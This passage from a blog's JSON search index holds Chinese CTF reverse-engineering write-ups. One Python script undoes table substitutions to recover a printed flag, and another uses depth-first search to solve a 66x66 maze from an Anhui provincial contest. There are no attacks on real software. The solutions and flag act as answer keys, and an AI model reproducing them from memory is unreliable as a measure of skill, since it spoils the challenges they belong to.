0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF] def fun2(): for i in range(1,len(flag)-1): for j in range(len(by280)): if flag[i] == by280[j]: flag[i] = j break def fun3(): for i in range(1,len(flag)-1): for j in range(len(by380)): if flag[i] == by380[j]: flag[i] = j break def fun5(): for i in range(1,len(flag)-1): for j in range(len(by580)): if flag[i] == by580[j]: flag[i] = j break def fun7(): for i in range(1,len(flag)-1): for j in range(len(by780)): if flag[i] == by780[j]: flag[i] = j break def funb(): for i in range(1,len(flag)-1): for j in range(len(byb80)): if flag[i] == byb80[j]: flag[i] = j break def fund(): for i in range(1,len(flag)-1): for j in range(len(byd80)): if flag[i] == byd80[j]: flag[i] = j break def fun11(): for i in range(1,len(flag)-1): for j in range(len(by1180)): if flag[i] == by1180[j]: flag[i] = j break def fun13(): for i in range(1,len(flag)-1): for j in range(len(by1380)): if flag[i] == by1380[j]: flag[i] = j break def fun17(): for i in range(1,len(flag)-1): for j in range(len(by1780)): if flag[i] == by1780[j]: flag[i] = j break def fun1d(): for i in range(1,len(flag)-1): for j in range(len(by1d80)): if flag[i] == by1d80[j]: flag[i] = j break fun1d() fun17() fun13() fun11() fund() funb() fun7() fun5() fun3() fun2() print(bytearray(flag)) index = [&#39;2&#39;, &#39;3&#39;, &#39;5&#39;, &#39;7&#39;, &#39;b&#39;, &#39;d&#39;, &#39;11&#39;, &#39;13&#39;, &#39;17&#39;, &#39;1d&#39;] # #y0u_4r3_7h3_m4573r_0f_r3v3r51n6_! &#x3D;&#x3D;然后这里注意的是flag[i] &#x3D; j后一定要加break，不然会无，然后第二段数据有多解，在移位操作处加&amp;0xfffffff,比如((a1[12] &lt;&lt; 6)&amp;0xffffffff)，这样才算和c代码成功转换&#x3D;&#x3D;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"安徽省赛","slug":"安徽省赛","date":"2022-11-21T06:13:57.000Z","updated":"2024-06-25T13:57:33.582Z","comments":true,"path":"2022/11/21/安徽省赛/","link":"","permalink":"https://pa1r0t.github.io/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/","excerpt":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来","text":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来 呃， 我其实也是第一次见这么庞大的迷宫，一共4384个格~~ 这里看见一行66 代码逻辑很简单，这里不做过多介绍 &#x2F;我原先的脚本的思路是走到错的地方再返回，导致效率太低，跑了好久都没跑出来&#x2F; 赛后我还未想好该怎么优化我的深搜算法，所以就进行了一波手工画图。。。。。。。。 图一： 图二： 图三： emmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 然后就根据这个路线，手写路线字符串 以上是我写的，本办法，太菜了，只能这么搞了 ##下面贴上EDI团队的脚本 map = [] data =[map[i*66:i*66+66] for i in range(66)] print(data) usedmap = [[0 for i in range(len(data))] for i in range(len(data)) ] flag=&quot;&quot; def DFS(x,y): global flag if x == 64 and y == 65: print(flag) if data[x+1][y] == 0 and usedmap [x+1][y] == 0: usedmap [x][y] = 1 flag += &#39;s&#39; DFS(x+1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x-1][y] == 0 and usedmap [x-1][y] == 0: usedmap [x][y] = 1 flag += &#39;w&#39; DFS(x-1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y+1] == 0 and usedmap [x][y+1] == 0: usedmap [x][y] = 1 flag += &#39;d&#39; DFS(x,y+1) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y-1] == 0 and usedmap [x][y-1] == 0: usedmap [x][y] = 1 flag += &#39;a&#39; DFS(x,y-1) flag = flag[:-1] usedmap [x][y] = 0 y=0 x=1 try: DFS(x,y) except: pass 他们的脚本其实就是只走对的位置，我实在没想到居然效率会快这么多！！！！！！！！！ 后来我参照他们的思路，重新优化了一下我的脚本，可以说在他们的基础上在一次优化了程序的效率 只能说算法实在太重要了！！！！！！！！！！！！！！ 我的代码：def dfs(v6, v7): global flag if len(flag) &gt; 364: # 这里防止深度过深 return if v6 == 64 and v7 == 65: print(flag) tlag[66 * v6 + v7] = 1 # 标记走过了 if map1[66 * v6 + v7 + 1] == 0 and tlag[66 * v6 + v7+1] == 0: # 这个位置能不能走，有没有走过 flag += &#39;d&#39; dfs(v6, v7 + 1) flag = flag[:-1] if map1[66 * (v6+1) + v7] == 0 and tlag[66 * (v6+1) + v7] == 0: flag += &#39;s&#39; dfs(v6+1,v7) flag = flag[:-1] if map1[66 * (v6-1) + v7] == 0 and tlag[66 * (v6-1) + v7] == 0: flag += &#39;w&#39; dfs(v6-1, v7) flag = flag[:-1] if map1[66 * (v6) + v7 - 1] == 0 and tlag[66 * (v6) + v7-1] == 0: flag += &#39;a&#39; dfs(v6, v7 - 1) flag = flag[:-1] # 这里不用将标志去掉，因为这个位置所有方向都走过了都没到终点，那么其他位置到达该位置也无法到达终点，所以懂吧？ if __name__ == &quot;__main__&quot;: map1 = [] tlag = [0]*len(map1) flag = &quot;&quot; try: dfs(1, 0) except: pass 至于代码的细节这里直接看注释即可，都已经写好了 总结这里个人的算法功底还有待提升，算法还是要多练，不然明明会做，但是现场做不出来，太难受了！！！","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]}],"categories":[{"name":"AI","slug":"AI","permalink":"https://pa1r0t.github.io/categories/AI/"},{"name":"基础","slug":"AI/基础","permalink":"https://pa1r0t.github.io/categories/AI/%E5%9F%BA%E7%A1%80/"},{"name":"论文","slug":"AI/论文","permalink":"https://pa1r0t.github.io/categories/AI/%E8%AE%BA%E6%96%87/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"https://pa1r0t.github.io/categories/AI/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"工具使用","slug":"ctf/工具使用","permalink":"https://pa1r0t.github.io/categories/ctf/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"Windows逆向","slug":"ctf/Windows逆向","permalink":"https://pa1r0t.github.io/categories/ctf/Windows%E9%80%86%E5%90%91/"},{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"name":"PAT练习","slug":"PAT练习","permalink":"https://pa1r0t.github.io/categories/PAT%E7%BB%83%E4%B9%A0/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"},{"name":"工具使用","slug":"re/工具使用","permalink":"https://pa1r0t.github.io/categories/re/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"Windows逆向","slug":"re/Windows逆向","permalink":"https://pa1r0t.github.io/categories/re/Windows%E9%80%86%E5%90%91/"},{"name":"技巧与典型场景","slug":"re/技巧与典型场景","permalink":"https://pa1r0t.github.io/categories/re/%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF/"},{"name":"前置知识","slug":"re/前置知识","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"},{"name":"常见混淆技术","slug":"ctf/常见混淆技术","permalink":"https://pa1r0t.github.io/categories/ctf/%E5%B8%B8%E8%A7%81%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"期刊","slug":"期刊","permalink":"https://pa1r0t.github.io/tags/%E6%9C%9F%E5%88%8A/"},{"name":"李宏毅","slug":"李宏毅","permalink":"https://pa1r0t.github.io/tags/%E6%9D%8E%E5%AE%8F%E6%AF%85/"},{"name":"IDA","slug":"IDA","permalink":"https://pa1r0t.github.io/tags/IDA/"},{"name":"OD","slug":"OD","permalink":"https://pa1r0t.github.io/tags/OD/"},{"name":"VMProtect","slug":"VMProtect","permalink":"https://pa1r0t.github.io/tags/VMProtect/"},{"name":"Microcode","slug":"Microcode","permalink":"https://pa1r0t.github.io/tags/Microcode/"},{"name":"编译原理","slug":"编译原理","permalink":"https://pa1r0t.github.io/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"csapp","slug":"csapp","permalink":"https://pa1r0t.github.io/tags/csapp/"},{"name":"unicorn","slug":"unicorn","permalink":"https://pa1r0t.github.io/tags/unicorn/"}]}